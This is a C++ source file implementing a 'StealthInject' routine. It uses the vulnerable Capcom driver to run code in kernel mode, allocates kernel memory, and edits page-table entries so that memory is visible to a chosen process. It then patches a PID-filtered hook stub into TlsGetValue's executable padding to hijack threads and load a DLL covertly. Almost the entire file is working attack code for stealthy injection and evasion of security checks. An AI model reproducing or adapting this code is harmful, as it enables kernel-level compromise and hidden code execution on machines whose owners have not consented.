#include <windows.h>
#include <Psapi.h>
#include <string>
#include <stdio.h>
#include "MemoryController.h"
#include "../CapcomDriverAttack/CapcomWrapper.h"
#include "KernelDLLMapper.h"

using namespace std;

struct ALLOCATE_DATA {
    SIZE_T size;
    PVOID memPtr = NULL;
};

void __stdcall AllocateKernelMemory(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID userData) {
    ALLOCATE_DATA* pData = (ALLOCATE_DATA*)userData;
    pData->memPtr = (ALLOCATE_DATA*)CallWithInterruptsAndSmep(
        ExAllocatePool,
        0ull, 
        pData->size
   );
}

PVOID AllocateKernelMemory(SIZE_T size) {
    PVOID buf;
    ALLOCATE_DATA data;
    data.size = size;
    RunInKernel(AllocateKernelMemory, &data);
    buf = data.memPtr;
    return buf;
}

BOOL ExposeKernelMemoryToProcess(PVOID memory, SIZE_T size, uint64_t eProcess) {

    SetTargetEProcess(eProcess);
    BOOL success = TRUE;

    IterPhysRegion(memory, size, [&](PVOID va, uint64_t pa, SIZE_T sz) {
		auto info = QueryPageTableInfo(va);

		info.Pml4e->user = TRUE;
		info.Pdpte->user = TRUE;
		info.Pde->user = TRUE;

		if (!info.Pde || (info.Pte && (!info.Pte->present))) {
			success = FALSE;
		}
		else {
			if (info.Pte) {
                info.Pte->user = TRUE;
            }
		}
	});

    UnsetEProcess();
    
    return success;
}

PUCHAR FindKernelPadSinglePage(PUCHAR start, SIZE_T size) {
	PUCHAR it = start;

	MEMORY_BASIC_INFORMATION mbi;

	PUCHAR streakStart = 0;
	int streak = 0;

	do {
		if ((0x1000 - (uint64_t(it) & 0xFFF)) < size) {
			it++;
			continue;
		}

		if (*it == 0) {
			if (!streak) {
                streakStart = it;
            }
			streak++;
		}
		else {
			streak = 0;
			streakStart = 0;
		}

		if (streak >= size) {
            return streakStart;
        }

		VirtualQuery(it, &mbi, sizeof(mbi));

		it++;
	}
	while ((mbi.Protect == PAGE_EXECUTE_READWRITE || mbi.Protect == PAGE_EXECUTE_READ || mbi.Protect == PAGE_EXECUTE_WRITECOPY));
	return 0;
}


BOOL StealthInject(string processName, string dllPath) {

    if (!InitMemoryController()) {
        return FALSE;
    }

    // Not &TlsGetValue to avoid __imp intermodule calls
    PUCHAR _TlsGetValue = (PUCHAR)GetProcAddress(GetModuleHandleA("KERNEL32"), "TlsGetValue");
    if (*_TlsGetValue != 0xE9 && *_TlsGetValue != 0xEB) {
        UnloadCapcomDriver();
        return FALSE;
    }
	PUCHAR target;
    if (*_TlsGetValue == 0xEB) {
        target = (_TlsGetValue + 2 + *(int8_t*) (_TlsGetValue + 1));
    } else {
        target = (_TlsGetValue + 5 + *(int32_t*) (_TlsGetValue + 1));
    }

    TlsLockedHookStatus* hookStatus;
    PVOID memory;
    vector<std::pair<PVOID, SIZE_T>> usedRegions;
    BOOL success = MapDllToKernel(dllPath, _TlsGetValue, target, TRUE, [&](SIZE_T size) {
        memory = AllocateKernelMemory(size);
		ExposeKernelMemoryToProcess(memory, size, currentEProcess);
		ZeroMemory(memory, size);
		usedRegions.push_back({memory, size});
		return memory;
    });
    UnloadCapcomDriver();
    if (!success) {
        return FALSE;
    }
    hookStatus = (TlsLockedHookStatus*)memory;
    
    uint64_t pid = 0;
	for (int i = 0; i < 200; i++) {
		pid = FindProcess(processName);
		Sleep(10);
	}
    if (!pid) {
        return FALSE;
    }
	// cout << "found " << processName.data() << ". Pid " << pid << endl;

    uint64_t eProcess = FindEProcess(pid);
	if (!eProcess) {
        return FALSE;
    }
    // cout << "EProcess: " << hex << eProcess << dec <<endl;

	// Expose region to process
	for (auto region : usedRegions) {
		// cout << "Exposing " << region.first << " (" << region.second << " bytes) to pid: " << pid << endl;
		ExposeKernelMemoryToProcess(region.first, region.second, eProcess);
	}

    vector<BYTE> pidBasedHook = {
		0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00,        // mov rax, gs:[0x30]
		0x8B, 0x40, 0x40,                                            // mov eax,[rax+0x40] ; pid
		0x3D, 0xDD, 0xCC, 0xAB, 0x0A,                                // cmp eax, 0xAABCCDD
		0x0F, 0x85, 0x00, 0x00, 0x00, 0x00,                          // jne 0xAABBCC
		0x48, 0xB8, 0xAA, 0xEE, 0xDD, 0xCC, 0xBB, 0xAA, 0x00, 0x00,  // mov rax, 0xAABBCCDDEEAA
		0xFF, 0xE0                                                   // jmp rax
	};

	PUCHAR padSpace = FindKernelPadSinglePage(_TlsGetValue, pidBasedHook.size());

	if (!padSpace) {
        return FALSE;
    }

	// printf("Hooking TlsGetValue @                   %16llx\n", (uint64_t)_TlsGetValue);
	// printf("TlsGetValue Redirection Target:         %16llx\n", (uint64_t)target);
	// printf("Stub located at:                        %16llx\n", (uint64_t)padSpace);
	// printf("Image located at:                       %16llx\n", (uint64_t)hookStatus);

	*(uint32_t*)(&pidBasedHook[ 0xD ]) = pid; // Pid
	*(int32_t*)(&pidBasedHook[ 0x13 ]) = target - (padSpace + 0x17); // Jmp
	*(PUCHAR*)(&pidBasedHook[ 0x19 ]) = &hookStatus->entryBytes; // Hook target
    
    BYTE jmp[5];
	jmp[0] = 0xE9;
	*(int32_t*)(jmp + 1) = padSpace - (_TlsGetValue + 5);

	vector<BYTE> backup1(pidBasedHook.size(), 0);
	vector<BYTE> backup2(5, 0);

	hookStatus->numThreadsWaiting = 0;
	hookStatus->isFree = FALSE;

	UnsetEProcess();

    auto AssertCoW = [&](PVOID page) {
		VirtualLock(page, 0x1);

		PSAPI_WORKING_SET_EX_INFORMATION ws;
		ws.VirtualAddress = page;
		QueryWorkingSetEx(HANDLE(-1), &ws, sizeof(ws));

		if (!ws.VirtualAttributes.Shared) {
            __noop("Page Not CoW");
        }
		VirtualUnlock(page, 0x1);
	};

    // check maching memory checks AND is CoW check 

	cout << "Writing stub to padding..." << endl;
	AssertCoW(padSpace);
	SetTargetEProcessIfCanRead(eProcess, padSpace);
	ReadVirtual(padSpace, backup1.data(), pidBasedHook.size());
	WriteVirtual(pidBasedHook.data(), padSpace, pidBasedHook.size());

	cout << "Writing the hook to TlsGetValue..." << endl;
	AssertCoW(_TlsGetValue);
	SetTargetEProcessIfCanRead(eProcess, _TlsGetValue);
	ReadVirtual(_TlsGetValue, backup2.data(), 5);
	WriteVirtual(jmp, _TlsGetValue, 5);

	cout << "Hooked! Waiting for threads to spin..." << endl;

	// Wait for threads to lock
	for (int i = 0; i < 500; i++) {
		// !ReadVirtual<BYTE>(&hookStatus->numThreadsWaiting)) {
        Sleep(1);
    }

		
	cout << "Threads spinning: " << (int)hookStatus->numThreadsWaiting << endl;

	// // Restore Backup
	SetTargetEProcessIfCanRead(eProcess, _TlsGetValue);
	WriteVirtual(backup2.data(), _TlsGetValue, 5);
	
	
	if (hookStatus->numThreadsWaiting) {
       cout << "Unhooked and started thread hijacking!" << endl;
    } else {
        cout << "ERROR: Wait timed out..." << endl;
    }

	hookStatus->isFree = TRUE;
	Sleep(2000);

	SetTargetEProcessIfCanRead(eProcess, padSpace);
	WriteVirtual(backup1.data(), padSpace, pidBasedHook.size());

	// TODO Use ntdll.dll imports instead of GetKernelRoutine() and see if it's still crashing on PC
	// first try NON_PAGED_CODE and NON_PAGED_DATA if possible

    return TRUE;
}

